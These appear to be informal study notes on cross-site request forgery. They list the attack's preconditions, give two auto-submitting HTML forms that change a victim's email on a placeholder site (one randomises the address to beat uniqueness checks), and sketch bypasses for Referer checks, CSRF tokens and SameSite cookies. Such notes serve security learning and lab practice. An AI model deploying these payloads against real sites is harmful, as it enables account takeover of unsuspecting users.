 
For a CSRF attack to be possible, three key conditions must be in place:

- **A relevant action.** There is an action within the application that the attacker has a reason to induce. 
- **Cookie-based session handling.** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.
- **No unpredictable request parameters.** The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.


```html
<script>history.pushState('', '', '/')</script>
<form action="https://vuln.com/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="anas&#64;hana" />
  <input type="submit" value="Submit request" />
</form>
	<script>document.forms[0].submit();</script>
```

What if the website only allow uniq emails, i got you:

```html
<script>history.pushState('', '', '/')</script>
<form id="emailForm" action="https://vuln.com/change-email" method="POST">
  <input type="hidden" id="emailField" name="email" />
  <input type="submit" value="Submit request" />
</form>
<script>
  var uniqueID = Math.floor(Math.random() * 100000);
  var email = "anas" + uniqueID + "@hana";
  document.getElementById('emailField').value = email;
  document.getElementById('emailForm').submit();
</script>
```


## Defences
- ### Referer-based validation
	- if it can be removed use <meta> tag to delete the refere.
	- or mybe it require to contain the word "domain" only then ? will be create.

- ### CSRF tokens
	- handle one method only mybe GET or POST 🥴
	- chack the token only if it exist !! _wtf who will make that shit_ `skip the lab`
	- some one use the csrf like copns every copon can change one email `Why whhhhhy `
	- another one will add a cookie csrf parameter and compare it with the csrf in post data `only when you can edit the victim cookies` this know as _double submit_
	
- ### SameSite cookies
	- add new parameter to Cookies `SameSite` have three options:
		- __Strict__: Browsers will not send it in any cross-site requests.
		- __Lax__: Only GET method, and No background requests.
		- __None__: Disables SameSite
	- How to ___HACK IT___: 
		- __Lax__: 
			- if they accept Get your are good
		- __Strict__:
			- it can be via open redierect
			- Find another vulnz or check the `Access-Control-Allow-Origin` in respnses  
	- You have to find another vicror or tool so you can make thing will effect the behavior of the Cookie mangement system